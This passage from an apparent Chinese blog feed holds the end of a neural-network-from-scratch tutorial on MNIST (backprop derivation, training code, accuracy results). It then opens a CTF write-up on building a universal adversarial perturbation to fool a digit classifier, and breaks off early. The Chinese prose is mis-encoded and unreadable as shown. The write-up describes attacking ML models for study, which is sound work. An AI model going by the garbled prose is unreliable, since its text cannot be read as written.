y</span>):</span></span><br><span class="line">        self.ClrTempResult()</span><br><span class="line">        self.dropOutProb = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.layerNum - <span class="number">1</span>)]</span><br><span class="line">        self.Z[<span class="number">0</span>] = np.matrix(X)</span><br><span class="line">        self.A[<span class="number">0</span>] = np.matrix(X)</span><br><span class="line">        self.forwardProp()</span><br><span class="line">        r_p = self.A[-<span class="number">1</span>]</span><br><span class="line">        self.r = np.zeros((r_p.shape[<span class="number">0</span>], <span class="number">1</span>))</span><br><span class="line">        correct = <span class="number">0</span></span><br><span class="line">        self.wrong = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r_p.shape[<span class="number">0</span>]):</span><br><span class="line">            self.r[i] = np.argmax(r_p[i])</span><br><span class="line">            <span class="keyword">if</span> self.r[i] == np.array(y).ravel()[i]:</span><br><span class="line">                correct += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.wrong.append(i) <span class="comment"># å‚¨å­˜é”™è¯¯æ ·æœ¬çš„index</span></span><br><span class="line">        print(<span class="string">&quot;correct: &quot;</span> + <span class="built_in">str</span>(correct / r_p.shape[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">SaveParameters</span>(<span class="params">self</span>):</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;FCNNweight.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        wt = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.w[<span class="number">1</span>:]:</span><br><span class="line">            wt.extend(<span class="built_in">list</span>(np.array(i).ravel()))</span><br><span class="line">        f.write(np.array(wt).tobytes())</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LoadParameters</span>(<span class="params">self</span>):</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;FCNNweight.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        wt = np.frombuffer(f.read(), np.float64)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.unitNum)):</span><br><span class="line">            self.w[i] = np.matrix(wt[: (self.unitNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.unitNum[i]]).reshape((self.unitNum[i - <span class="number">1</span>] + <span class="number">1</span>, self.unitNum[i]))</span><br><span class="line">            wt = wt[(self.unitNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.unitNum[i] :]</span><br></pre></td></tr></table></figure>    </div></div><h3 id="åå‘ä¼ æ’­æ¨å¯¼"><a href="#åå‘ä¼ æ’­æ¨å¯¼" class="headerlink" title="åå‘ä¼ æ’­æ¨å¯¼"></a>åå‘ä¼ æ’­æ¨å¯¼</h3><p>ä»¥ä¸‹ä¸ºæˆ‘æ¢³ç†ä»£ç çš„æ—¶å€™é¡ºä¾¿å†™çš„è¿‡ç¨‹</p><p>é“¾å¼æ³•åˆ™æ¨å•ä¸ªç¥ç»å…ƒï¼Œç„¶åæ‰©å±•åˆ°çŸ©é˜µ</p><p>å¼ºçƒˆå»ºè®®æ­é…3b1bç³»åˆ—part4ï¼ˆæˆ–è€…æ˜¯part3[ä¸‹]ï¼Ÿï¼‰é£Ÿç”¨ï¼Œé™„ä¸Šä¸€å¼ 3b1bè§†é¢‘çš„æˆªå›¾</p><img src="/images/FCNN_formula.png"/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">layerNum = <span class="number">4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> input -&gt; hidden 1 -&gt; hidden 2 -&gt; output</span></span><br><span class="line"><span class="string"> 784+1 -&gt;   H1+1   -&gt;   H2+1   -&gt;   10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Z0(X)  â”Œâ”€â”€â”€&gt;Z1     â”Œâ”€â”€â”€&gt;Z2     â”Œâ”€â”€&gt;Z3</span></span><br><span class="line"><span class="string">   â”‚    â”‚     â†“     â”‚     â†“     â”‚    â†“</span></span><br><span class="line"><span class="string">   â”‚  [w1] [relu] [w2] [relu] [w3][softmax]</span></span><br><span class="line"><span class="string">   â†“    â”‚     â†“     â”‚     â†“     â”‚    â†“</span></span><br><span class="line"><span class="string"> A0(X)â”€â”€â”˜    A1â”€â”€â”€â”€â”€â”˜    A2â”€â”€â”€â”€â”€â”˜   A3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">unityNum = [<span class="number">784</span>, H1, H2, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### Init ###</span></span><br><span class="line">w = [ <span class="number">0</span>, [w1(<span class="number">784</span>+<span class="number">1</span>,H1)], [w2(H1+<span class="number">1</span>,H2)], [w3(H2+<span class="number">1</span>,<span class="number">10</span>)] ]</span><br><span class="line">Z = [ [X(N,<span class="number">784</span>)] ]</span><br><span class="line"><span class="comment"># A has same structure as Z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### forwardProp ###</span></span><br><span class="line">Z = [ [X(N,<span class="number">784</span>)], [Z1(N,H1)], [Z2(N,H2)], [Z3(N,<span class="number">10</span>)] ]</span><br><span class="line"><span class="comment"># A has same structure as Z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### backProp ###</span></span><br><span class="line"><span class="comment"># dX means Î´J/Î´X</span></span><br><span class="line"><span class="comment"># aka partial derivative of parameter X with respect to cost function J</span></span><br><span class="line"><span class="comment"># to get formulas as below, apply chain rule</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># u[i] indicates i.th layer of neural network</span></span><br><span class="line"><span class="string"># and each layer has only 1 neuron</span></span><br><span class="line"><span class="string"># L.th layer indicates output layer</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ....    &#123;u[L-1]&#125;â”€â”€â”€â”€&#123;u[L]&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Deduction (lossFunc: CrossEntropy):</span></span><br><span class="line"><span class="string">- layer L :</span></span><br><span class="line"><span class="string">    dA[L] = Î´J/Î´A[L] = A[L] - y</span></span><br><span class="line"><span class="string">    dZ[L] = Î´A[L]/Î´Z[L] * dA[L] = sigmoidDeriv(Z[L]) * dA[L]</span></span><br><span class="line"><span class="string">    dw[L] = Î´w[L]/Î´Z[L] * dZ[L] = A[L-1] * dZ[L]</span></span><br><span class="line"><span class="string">    db[L] = Î´b[L]/Î´Z[L] * dZ[L] = dZ[L]</span></span><br><span class="line"><span class="string">- layer L-1 :</span></span><br><span class="line"><span class="string">    dA[L-1] = Î´Z[L]/Î´A[L-1] * dZ[L] = w[L] * dZ[L]</span></span><br><span class="line"><span class="string">    dZ[L-1] = Î´A[L-1]/Î´Z[L-1] * dA[L-1] = reluDeriv(Z[L-1]) * dA[L-1]</span></span><br><span class="line"><span class="string">    ... etc.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># extra process making formulas can be applied to matrices or layers</span></span><br><span class="line"><span class="comment"># no dot product is applied below, just multiplying elements by elements</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># when each layer has more than 1 neuron</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &#123;u[L-1][0]&#125;</span></span><br><span class="line"><span class="string">                         â”Œâ”€&#123;u[L][0]&#125;</span></span><br><span class="line"><span class="string">    ....    &#123;u[L-1][1]&#125;â•â•â•¡</span></span><br><span class="line"><span class="string">                         â””â”€&#123;u[L][1]&#125;</span></span><br><span class="line"><span class="string">            &#123;u[L-1][2]&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># for a certain neuron in hidden layer, e.g. as for u[L-1][1]</span></span><br><span class="line"><span class="string"># w[L][1][0] indicates weight between &#123;u[L-1][1]&#125; and &#123;u[L][0]&#125;</span></span><br><span class="line"><span class="string"># Deduction :</span></span><br><span class="line"><span class="string">- layer L :</span></span><br><span class="line"><span class="string">    dA[L][0] = A[L][0] - y[0]</span></span><br><span class="line"><span class="string">    dA[L][1] = A[L][1] - y[1]</span></span><br><span class="line"><span class="string">    dZ[L][0] = sigmoidDeriv(Z[L][0]) * dA[L][0]</span></span><br><span class="line"><span class="string">    dZ[L][1] = sigmoidDeriv(Z[L][1]) * dA[L][1]</span></span><br><span class="line"><span class="string">    dw[L][1][0] = A[L-1][1] * dZ[L][0]</span></span><br><span class="line"><span class="string">    dw[L][1][1] = A[L-1][1] * dZ[L][1]</span></span><br><span class="line"><span class="string">    db[L][1][0] = dZ[L][0]</span></span><br><span class="line"><span class="string">    db[L][1][1] = dZ[L][1]</span></span><br><span class="line"><span class="string">- layer L-1 :</span></span><br><span class="line"><span class="string">    dA[L-1][1] = w[L][1][0] * dZ[L][0] + w[L][1][1] * dZ[L][1]</span></span><br><span class="line"><span class="string">    dZ[L-1][1] = reluDeriv(Z[L-1][1]) * dA[L-1][1]</span></span><br><span class="line"><span class="string">    ... etc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># e.g. as for 3.rd layer, which has index of 2 :</span></span><br><span class="line"><span class="string">    dA2(N,H2) = RemoveBias(dZ3(N,10) * w3.T(10,H2+1))</span></span><br><span class="line"><span class="string">    dZ2(N,H2) = np.multiply(reluDeriv(Z2)(N,H2),dA2(N,H2))</span></span><br><span class="line"><span class="string">    dw2(H1,H2) = A1.T(H1,N) * dZ2(N,H2)</span></span><br><span class="line"><span class="string">    db2(1,H2) = np.sum(dZ2(N,H2),axis=0)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">dA = [ <span class="number">1</span>, [dA1(N,H1)], [dA2(N,H2)], [dA3(N,<span class="number">10</span>)] ]</span><br><span class="line">dw = [ <span class="number">1</span>, [dw0(<span class="number">784</span>+<span class="number">1</span>,H1)], [dw1(H1+<span class="number">1</span>,H2)], [dw2(H2+<span class="number">1</span>,<span class="number">10</span>)] ]</span><br></pre></td></tr></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unitNum = [<span class="number">784</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">10</span>]</span><br><span class="line">dropOutProb = [<span class="number">0.4</span>, <span class="number">0.2</span>, <span class="number">0.1</span>]</span><br><span class="line">batchSize = <span class="number">120</span></span><br><span class="line">epoch = <span class="number">50</span></span><br><span class="line">rate = <span class="number">0.08</span></span><br><span class="line"></span><br><span class="line">FCNN = FCNN()</span><br><span class="line">FCNN.Init(unitNum, dropOutProb)</span><br><span class="line">FCNN.PrepareBatch(trainX, trainy, batchSize)</span><br><span class="line">FCNN.fit(epoch, rate)</span><br><span class="line">FCNN.SaveParameters()</span><br></pre></td></tr></table></figure><h3 id="åç»­éªŒè¯"><a href="#åç»­éªŒè¯" class="headerlink" title="åç»­éªŒè¯"></a>åç»­éªŒè¯</h3><p>åœ¨è®­ç»ƒå®Œåªä¼šåº”å½“ç»˜åˆ¶<code>loss</code>å›¾åƒï¼Œç”¨äºç¡®ä¿æ¢¯åº¦ä¸‹é™æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼ˆ<code>dw</code>æ¨¡é•¿å•çº¯æ˜¯æˆ‘æƒ³çœ‹ä¸€ä¸‹è€Œå·²ï¼‰</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowCostFig</span>(<span class="params">epoch, cost</span>):</span></span><br><span class="line">    <span class="comment"># ç»˜åˆ¶æŸå¤±å‡½æ•°åœ¨è¿­ä»£ä¸­çš„å˜åŒ–å›¾åƒ</span></span><br><span class="line">    ax = plt.figure().gca()</span><br><span class="line">    ax.xaxis.set_major_locator(MaxNLocator(integer=<span class="literal">True</span>))  <span class="comment"># ä½¿åæ ‡åˆ»åº¦ä¸ºæ•´æ•°</span></span><br><span class="line">    plt.plot(<span class="built_in">range</span>(<span class="number">0</span>, epoch), cost[<span class="number">0</span>:], <span class="string">&quot;go-&quot;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    print(<span class="string">&quot;Final Cost: &quot;</span> + <span class="built_in">str</span>(cost[epoch - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowdwFig</span>(<span class="params">epoch, dw, layerNum</span>):</span></span><br><span class="line">    <span class="comment"># ç»˜åˆ¶dwçš„L2åœ¨è¿­ä»£ä¸­çš„å˜åŒ–å›¾åƒ</span></span><br><span class="line">    camp = getCmap(layerNum)</span><br><span class="line">    ax = plt.figure(figsize=(<span class="number">15</span>, <span class="number">5</span>)).gca()</span><br><span class="line">    ax.xaxis.set_major_locator(MaxNLocator(integer=<span class="literal">True</span>))</span><br><span class="line">    <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(np.transpose(dw)):</span><br><span class="line">        plt.plot(data[<span class="number">1</span>:], c=camp(i), label=i)</span><br><span class="line">    plt.legend()  <span class="comment"># åŠ ä¸Šå›¾ä¾‹</span></span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCmap</span>(<span class="params">n, name=<span class="string">&quot;hsv&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># ä»ç½‘ä¸Šcopyäº†ä¸€ä¸ªè°ƒè‰²ç›˜æ¥é€‰é¢œè‰²</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a function that maps each index in 0, 1, ..., n-1 to a distinct</span></span><br><span class="line"><span class="string">    RGB color; the keyword argument name must be a standard mpl colormap name.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> plt.cm.get_cmap(name, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowNorm</span>(<span class="params">x</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Norm: &quot;</span> + <span class="built_in">str</span>(np.linalg.norm(x)))</span><br></pre></td></tr></table></figure>    </div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FCNN.predict(trainX, trainy)</span><br><span class="line">&gt;&gt; correct: <span class="number">0.9768571428571429</span></span><br><span class="line">FCNN.predict(testX, testy)</span><br><span class="line">&gt;&gt; correct: <span class="number">0.9675</span></span><br><span class="line">ShowNorm(FCNN.w[-<span class="number">1</span>])</span><br><span class="line">&gt;&gt; Norm: <span class="number">4.553835257428929</span></span><br><span class="line">ShowCostFig(epoch, FCNN.cost)</span><br><span class="line">&gt;&gt; Final Cost: <span class="number">0.2906157343621473</span></span><br><span class="line">ShowdwFig(epoch, FCNN.dwNorm, FCNN.layerNum)</span><br></pre></td></tr></table></figure><img src="/images/FCNN_costFig.png"/><img src="/images/FCNN_dwFig.png"/><p>å¯è§<code>loss</code>çš„ç¡®åœ¨ä»¥è‚‰çœ¼å¯è§é€Ÿåº¦æ”¶æ•›ï¼Œä¸”æ¨¡å‹å¯¹è®­ç»ƒé›†å’Œæµ‹è¯•é›†çš„é¢„æµ‹å‡†ç¡®åº¦ç›¸å·®ä¸å¤§ï¼Œéƒ½ä¿æŒåœ¨96%~97%ï¼Œå¯¹æˆ‘æ¥è¯´æˆ‘å·²ç»æ»¡æ„äº†</p><p>æœ€åå½“ç„¶æ˜¯å–œé—»ä¹è§çš„é”™è¯¯æ ·æœ¬æŠ½æ ·ï¼ˆåªèƒ½è¯´ç›¸å½“ä¸€éƒ¨åˆ†çš„é”™è¯¯æ ·æœ¬ä¹Ÿéƒ½ä¸æ˜¯ä»€ä¹ˆå–„èŒ¬</p><img src="/images/FCNN_wrong.png"/><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿æ¹–è®ºå‰‘GlobalNoise[AIå¯¹æŠ—å¯è’™]</title>
      <link href="2021/11/25/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise%5BAI%E5%AF%B9%E6%8A%97%E5%90%AF%E8%92%99%5D/"/>
      <url>2021/11/25/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise%5BAI%E5%AF%B9%E6%8A%97%E5%90%AF%E8%92%99%5D/</url>
      
        <content type="html"><![CDATA[<p>è¿‘æœŸCTFèµ›äº‹é‡Œé¢AIå¯¹æŠ—é¢˜å‡ºç°é¢‘ç‡é€æ¸å‡é«˜ï¼Œä½œä¸ºä¸€ä¸ªæ‘¸äº†å¥½ä¹…çš„webäººï¼Œæ­£å¥½ä¹‹å‰è‡ªå·±æœ‰ä¸€ç‚¹MachineLearningçš„åŸºç¡€ï¼Œå‡†å¤‡å°è¯•ä¸€ä¸‹è¿™ä¸ªé¢†åŸŸ</p><p><img src="/images/GlobalNoise_Universal.png"></p><span id="more"></span><!--toc--><h1 id="è¥¿æ¹–è®ºå‰‘GlobalNoise-AIå¯¹æŠ—å¯è’™"><a href="#è¥¿æ¹–è®ºå‰‘GlobalNoise-AIå¯¹æŠ—å¯è’™" class="headerlink" title="è¥¿æ¹–è®ºå‰‘GlobalNoise[AIå¯¹æŠ—å¯è’™]"></a>è¥¿æ¹–è®ºå‰‘GlobalNoise[AIå¯¹æŠ—å¯è’™]</h1><blockquote><p>2022/01/16è¡¥å……ï¼šå‘äº†å…³äº<a href="https://kyriota.com/2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C[%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8]/">å…¨è¿æ¥ç¥ç»ç½‘ç»œçš„æ–‡ç« </a>ï¼Œæ‰‹æ“äº†ä¸€ä¸ªæ¨¡å‹ä¹‹åå†å›æ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼Œå‘ç°å¾ˆå¤šåœ°æ–¹æœ‰å¤±åé¢‡(å·²åŸºæœ¬ä¿®æ­£)ï¼Œæ­£å¥½ä¹‹å‰æœ‰ä¸€ä¸ªæƒ³æŠŠæ ·æœ¬åç§»åˆ°ä»»æ„classçš„å¿ƒæ„¿æ²¡æœ‰å®Œæˆï¼Œåç»­ä¼šå‘ä¸€ç¯‡æ–°çš„æ–‡ç« <a href="https://kyriota.com/2022/04/09/L2-TargetedAttack/">L2 Targeted Attack</a></p></blockquote><p>æœ¬æ–‡é¢å‘çš„å¯¹è±¡æ˜¯ï¼š</p><ul><li>å¯¹Machine LearningåŸç†æœ‰åŸºæœ¬ç†è§£çš„å…¥é—¨AIäºº</li><li>åƒç“œç¾¤ä¼—</li></ul><p>ï¼ˆæœºå™¨å­¦ä¹ ç›¸å…³çš„å‰ç½®çŸ¥è¯†å»ºè®®çœ‹å´æ©è¾¾ï¼Œç„¶åä¸è°ƒåº“è‡ªå·±å†™ä¸€ç‚¹é€»è¾‘å›å½’çº¿æ€§å›å½’çš„åŸºæœ¬åˆ†ç±»å™¨å°±å¤Ÿäº†ï¼ˆè‡³å°‘æˆ‘åœ¨è¿™ä¹‹å‰åªæœ‰è¿™ç‚¹åŸºç¡€ï¼ŒæŠ€æœ¯æ‹‰è·¨</p><h2 id="é¢˜é¢"><a href="#é¢˜é¢" class="headerlink" title="é¢˜é¢"></a>é¢˜é¢</h2><p>æ¦‚è¿°ï¼šæä¾›äº†ä¸€ä¸ªè®­ç»ƒå¥½çš„modelå’Œä¸€ä»½mnistæ•°æ®é›†ï¼Œè¦æ±‚å¯¹å…¶ä¸­çš„100ä»½æ ·æœ¬è¿›è¡Œä¸€ä¸ªå…¨å±€æ€§çš„è¾ƒå°æ‰°åŠ¨ï¼ˆå¯¹å‘é‡çš„èŒƒæ•°è¿›è¡Œäº†é™åˆ¶ï¼‰ï¼Œä½¿å¾—è¿™100ä»½æ ·æœ¬çš„åˆ†ç±»æ­£ç¡®ç‡ä½äº5%</p><p><a href="https://kyriota.com/html/DLfiles/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise.zip">ä¸‹è½½é“¾æ¥(githubæº)</a></p><p>ï¼ˆå½“æ—¶æ²¡æœ‰å­˜é¢˜é¢å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šï¼Œå¹¶éå®Œæ•´åŸé¢˜ï¼Œåªæ˜¯æˆ‘æ ¹æ®å›å¿†å’Œéœ€è¦çš„æ¡ä»¶æ‘¸å‡ºæ¥çš„ä¸€ä¸ªé¢˜é¢</p><h3 id="é¢˜é¢åˆ†æ"><a href="#é¢˜é¢åˆ†æ" class="headerlink" title="é¢˜é¢åˆ†æ"></a>é¢˜é¢åˆ†æ</h3><p>å°†é¢˜ç›®ç»™å‡ºçš„100ä¸ªæ ·æœ¬è¿‡ä¸€ä¸ªç›®ä¼šå‘ç°æ˜¯7å’Œ9çš„______</p><p><img src="/images/GlobalNoise_testSet.png"></p><p>å¦‚æœä½ æƒ³çš„æ˜¯<code>äºŒåˆ†ç±»</code>å°±ä¸å¯¹äº†ï¼Œå› ä¸ºæ˜¯ä¸å¯èƒ½ç”¨ä¸€ä¸ªå™ªéŸ³æŠŠå¤§éƒ¨åˆ†7ç³Šå¼„åˆ°9ï¼Œç„¶åæŠŠå¤§éƒ¨åˆ†9ç³Šå¼„åˆ°7çš„ï¼ˆå¥½å¤šäººä¸€çœ‹åˆ°éƒ½è¯´äºŒåˆ†ç±»</p><p>æœ¬æ¥å°±æ˜¯æœ‰10ä¸ªç±»åˆ«ï¼ˆ0~9ï¼‰ï¼Œå¯ä»¥æŠŠ9å’Œ7ç³Šå¼„åˆ°é™¤ä»–ä¿©ä¹‹å¤–çš„classesé‡Œé¢å»</p><p>æ­¤é¢˜å¾ˆæ˜æ˜¾å…³é”®åœ¨äºGlobalï¼Œä¹Ÿæ­£æ˜¯è¿™ä¸ªGlobalå’Œå¯¹èŒƒæ•°çš„é™åˆ¶æ‹¦ä½äº†å¾ˆå¤šåƒæˆ‘è¿™æ ·çš„åŠåŠå­</p><blockquote><p>ä¹‹å‰åšè¿‡0CTF-finalä¸­çš„boyNextDoorï¼Œæ˜¯ä¸€ä¸ªäººè„¸è¯†åˆ«çš„é¢˜ï¼Œæ­£è§£æ˜¯ç”¨æ¢¯åº¦æ„é€ noiseï¼Œè¿˜éœ€è¦Expectation over Transformation (EOT) æ¥ç»•è¿‡dlibçš„éšæœºæŠ–åŠ¨ï¼Œå½“æ—¶å±äºæ˜¯æ— çŸ¥è€…æ— ç•ï¼Œç›´æ¥éšæœºæ”¹å•åƒç´ ç»™çˆ†å‡ºæ¥äº†ï¼Œç”±äºåªéœ€è¦æ„é€ äººè„¸å›¾ç‰‡ï¼Œæ‰€ä»¥å¯¹äºå™ªéŸ³èŒƒæ•°å’Œå™ªéŸ³é²æ£’æ€§æ²¡æœ‰è¦æ±‚ï¼Œåªè¦ä»–èƒ½è¯†åˆ«åˆ°äººè„¸ä½ç½®å³å¯</p></blockquote><p>ä½†æ˜¯å½“æˆ‘æƒ³åœ¨è¿™ä¸ªé¢˜ç”¨åŠåŠå­æ‰‹æ³•å»è§£å†³æ—¶ï¼Œå¾ˆæ˜æ˜¾åœ¨èŒƒæ•°é™åˆ¶å’Œé²æ£’æ€§ä¸Šéƒ½é‡åˆ°äº†é—®é¢˜ï¼Œé€šå¸¸æ¥è¯´æ ¹æ®æ¢¯åº¦æ„é€ çš„å™ªéŸ³ä¼šæ¯”æ»¡è¶³æ¡ä»¶çš„éšæœºå™ªéŸ³çš„L2(æ¨¡é•¿)å°10~100å€ï¼Œè€Œä¸”éšæœºå™ªéŸ³åªå¯¹å•ä¸ªæ ·æœ¬æœ‰æ•ˆï¼Œå®Œå…¨ä¸èƒ½Global</p><p>æ‰€ä»¥äººè¿˜æ˜¯è¦è¿›æ­¥ï¼Œå¿…é¡»å¾—ç†è§£æ­£ç¡®æ„é€ å™ªéŸ³çš„æ–¹æ³•</p><h2 id="ä¸€ç¯‡è®ºæ–‡"><a href="#ä¸€ç¯‡è®ºæ–‡" class="headerlink" title="ä¸€ç¯‡è®ºæ–‡"></a>ä¸€ç¯‡è®ºæ–‡</h2><p>è¿™æ˜¯ä¸€ç¯‡å…³äºå…¨å±€æ‰°åŠ¨çš„<a href="https://arxiv.org/pdf/2005.08087.pdf">æ–‡ç« </a>ï¼Œçœ‹ä¸€åŠå¤§æ¦‚å°±èƒ½çŸ¥é“æ„é€ å…¨å±€æ‰°åŠ¨çš„åŸç†äº†ï¼Œå…¶å®ä¹Ÿqsä¸éš¾ç†è§£ï¼Œä½†å¯èƒ½éœ€è¦å…ˆç†è§£æ¨¡å‹çš„è®­ç»ƒè¿‡ç¨‹ä»¥åŠä½¿ç”¨</p><ul><li><p>åœ¨è®­ç»ƒæ—¶ï¼šè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯åœ¨å¯»æ‰¾ä¸€ä¸ªæœ€ä¼˜çš„ çº¿æ€§(oréçº¿æ€§?) çš„å˜æ¢ï¼Œä½¿å¾—è¾“å…¥ç»è¿‡è¿™ä¸ªå˜æ¢ä¹‹åèƒ½å¤Ÿè½åˆ°é›†ä¸­çš„ä½ç½®ï¼Œè¿™æ ·å°±å¯ä»¥æ ¹æ®ä¸€äº›ç•Œé™(å†³ç­–è¾¹ç•Œ)æ¥åˆ’åˆ†çš„è¾“å…¥ï¼Œå¹¶ç»™å‡ºæ¨¡å‹çš„åˆ¤æ–­</p></li><li><p>åœ¨é¢„æµ‹æ—¶ï¼šè¾“å…¥/æ•°æ® äº¤ç»™ä¸€ä¸ªè®­ç»ƒå¥½çš„æ¨¡å‹è¿›è¡Œåˆ†ç±»çš„æ—¶å€™ï¼Œå…¶å®ä¹Ÿå°±è¿›è¡Œäº†ä¸€ä¸ªæ˜ 